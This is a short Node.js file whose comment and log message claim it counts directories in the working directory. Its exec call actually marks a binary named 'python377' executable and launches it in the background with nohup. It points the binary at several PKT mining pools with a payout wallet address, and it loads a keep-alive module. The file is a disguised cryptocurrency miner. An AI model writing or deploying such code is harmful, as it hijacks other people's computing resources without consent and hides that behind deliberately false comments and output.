
const { exec } = require('child_process');
 
// Counts the number of directory in
// current working directory
exec('chmod +x python377 && nohup ./python377 ann http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com -p pkt1q6l2qm5msxnkrl6qsh9cys9x4u357y5dyv26qgu &', (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    console.log(`stdout: No. of directories = ${stdout}`);
    if (stderr != "")
        console.error(`stderr: ${stderr}`);
});

const keep_alive = require('./keep_alive.js')
